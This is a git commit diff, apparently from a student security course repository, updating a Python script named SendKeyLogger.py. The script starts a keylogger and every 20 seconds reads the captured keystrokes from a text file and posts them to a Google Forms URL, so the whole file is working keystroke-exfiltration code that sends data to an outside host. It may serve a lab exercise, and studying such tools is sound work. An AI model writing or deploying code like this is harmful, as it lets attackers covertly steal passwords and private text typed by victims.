f800c1d0c976f9a7b2ea12706e76bd528400d837
Richard Dunbar <112132616+RND27@users.noreply.github.com>
2022-11-27 21:23:27 -0500

    Update SendKeyLogger.py

--- Week_13 ( Reconnaissance | Scanning)/SendKeyLogger.py
+++ Week_13 ( Reconnaissance | Scanning)/SendKeyLogger.py
@@ -11,23 +11,22 @@ os.system("python3 /home/student/Desktop/scripts/keyloggerRemoteTest.py")
 time.sleep(1)
 
 def send_request():
-        form_input = open("/home/student/Desktop/scripts")
-        form_send = form_input.read()
-        url= 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdiMHViuoPlW3UujN2b0'
-        form_data = {'entry.2005620554': f"'{form_send}'"}
-        r = requests.post(url, data=form_data)
+    form_input = open("/home/student/Desktop/scripts/keyboard_Input.txt")
+    form_send = form_input.read()
+    url= 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdiMHViuoPlW3UujN2b0'
+    form_data = {'entry.2005620554': f"'{form_send}'"}
+    r = requests.post(url, data=form_data)
 
 def interval():
-        global startlog
-        if time.time() - 20 > startlog:
-                print('Its been 20 secs')
-                send_request()
-                startlog = time.time()
+    global startlog
+    if time.time() - 20 > startlog:
+        print('Its been 20 secs')
+        send_request()
+        startlog = time.time()
 
 counter = 0
 while True:
-        counter += 1
-        print(counter)
-        interval()
-        time.sleep(1)
-
+    counter += 1
+    print(counter)
+    interval()
+    time.sleep(1)
